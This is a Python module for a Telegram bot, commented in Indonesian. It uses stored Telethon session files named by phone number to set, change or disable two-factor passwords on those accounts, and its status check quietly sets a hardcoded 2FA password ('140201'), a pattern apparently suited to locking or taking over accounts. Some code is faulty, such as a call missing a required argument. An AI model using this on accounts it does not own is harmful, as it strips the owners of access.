import os
from telethon import TelegramClient, errors
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes

SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'a2_sessions'))

# Fungsi untuk mengecek status 2FA
async def check_2fa_status(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    query = update.callback_query
    await query.answer()
    
    if not phone_number:
        # Debug: Cek isi dari callback_data
        print(f"Callback Data: {query.data}")  # Untuk debugging
        try:
            phone_number = query.data.split('_')[-1]  # Ambil nomor telepon dari callback_data
        except IndexError:
            phone_number = None

    # Debug: Cek nilai phone_number
    print(f"Phone Number: {phone_number}")

    if not phone_number:
        await query.message.reply_text("❌ Nomor telepon tidak ditemukan.", parse_mode='Markdown')
        return

    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await query.message.reply_text(f"❌ Session tidak ditemukan untuk:\n{phone_number}", parse_mode='Markdown')
        return

    api_id = context.bot_data.get("api_id")
    api_hash = context.bot_data.get("api_hash")

    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()

    if not await client.is_user_authorized():
        await query.message.reply_text("❌ Akun belum login.")
        await client.disconnect()
        return

    try:
        # Cek apakah 2FA aktif
        try:
            await client.edit_2fa(new_password="140201", hint="Hint untuk password baru")
            await query.message.reply_text("✅ 2FA sudah aktif, password baru telah diatur.")
            return
        except errors.SessionPasswordNeededError:
            # Jika 2FA aktif, tampilkan tombol untuk mengganti password 2FA
            keyboard = [
                [InlineKeyboardButton("🔐 Ganti 2FA Password", callback_data=f"change_2fa_{phone_number}")],
                [InlineKeyboardButton("❌ Nonaktifkan 2FA", callback_data=f"start_disable_2fa_{phone_number}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(
                "ℹ️ 2FA sudah aktif. Jika Anda ingin mengganti password 2FA atau menonaktifkan 2FA, pilih opsi di bawah.",
                reply_markup=reply_markup
            )
    except Exception as e:
        await query.message.reply_text(f"❌ Gagal memeriksa 2FA:\n{e}", parse_mode='Markdown')
    finally:
        await client.disconnect()

# Fungsi untuk mengganti 2FA (menggunakan password lama dan baru)
async def change_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    query = update.callback_query
    await query.answer()

    # Menyimpan nomor telepon untuk sesi
    context.user_data["phone_number"] = phone_number

    # Meminta password lama
    await query.message.reply_text("🔐 Masukkan password lama untuk mengganti 2FA:")
    context.user_data["state"] = "OLD_PASSWORD"
    return "OLD_PASSWORD"

# Fungsi untuk menonaktifkan dan mengganti password 2FA
async def remove_and_set_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    query = update.callback_query
    await query.answer()

    old_password = context.user_data.get("old_password")
    new_password = context.user_data.get("new_password")
    phone_number = context.user_data.get("phone_number")

    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    print(f"Session path: {session_path}")

    if not os.path.exists(session_path):
        await query.message.reply_text(f"❌ Session tidak ditemukan untuk:\n{phone_number}", parse_mode='Markdown')
        return

    api_id = context.bot_data.get("api_id")
    api_hash = context.bot_data.get("api_hash")

    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()

    if not await client.is_user_authorized():
        await query.message.reply_text("❌ Akun belum login.")
        await client.disconnect()
        return

    try:
        # Nonaktifkan 2FA dengan password lama
        await client.edit_2fa(password=old_password)

        # Mengaktifkan kembali 2FA dengan password baru
        await client.edit_2fa(new_password=new_password, hint="Password baru untuk 2FA")
        await query.message.reply_text("✅ 2FA berhasil diganti dengan password baru.")
    except Exception as e:
        await query.message.reply_text(f"❌ Gagal mengganti 2FA:\n{e}", parse_mode='Markdown')
    finally:
        await client.disconnect()

# Fungsi untuk memulai proses nonaktifkan 2FA (meminta password lama)
async def start_disable_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    query = update.callback_query
    await query.answer()

    # Simpan nomor telepon ke user_data dan set state
    context.user_data["phone_number"] = phone_number
    context.user_data["state"] = "DISABLE_2FA_PASSWORD"

    await query.message.reply_text("🔐 Masukkan password lama Anda untuk menonaktifkan 2FA:")

# Fungsi untuk menonaktifkan 2FA menggunakan password lama
async def disable_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    old_password = context.user_data.get("old_password")
    phone_number = context.user_data.get("phone_number")

    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await update.message.reply_text(f"❌ Session tidak ditemukan untuk:\n{phone_number}", parse_mode='Markdown')
        return

    api_id = context.bot_data.get("api_id")
    api_hash = context.bot_data.get("api_hash")

    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()

    if not await client.is_user_authorized():
        await update.message.reply_text("❌ Akun belum login.")
        await client.disconnect()
        return

    try:
        # Nonaktifkan 2FA menggunakan password lama
        await client.edit_2fa(password=old_password)
        await update.message.reply_text("✅ 2FA berhasil dinonaktifkan.")
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal menonaktifkan 2FA:\n{e}", parse_mode='Markdown')
    finally:
        await client.disconnect()

# Fungsi untuk menangani input password lama dan baru
async def password_input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fungsi untuk menangani input password lama dan baru dari pengguna"""
    state = context.user_data.get("state")

    if state == "OLD_PASSWORD":
        # Simpan password lama yang dimasukkan pengguna
        context.user_data["old_password"] = update.message.text
        # Minta password baru
        await update.message.reply_text("🔐 Masukkan password baru untuk 2FA:")
        context.user_data["state"] = "NEW_PASSWORD"  # Set state ke NEW_PASSWORD
        return

    if state == "NEW_PASSWORD":
        # Simpan password baru yang dimasukkan pengguna
        context.user_data["new_password"] = update.message.text
        return await remove_and_set_2fa(update, context)  # Proses penggantian 2FA

    if state == "DISABLE_2FA_PASSWORD":
        context.user_data["old_password"] = update.message.text
        return await disable_2fa(update, context)  # Nonaktifkan 2FA dengan password yang sudah dimasukkan
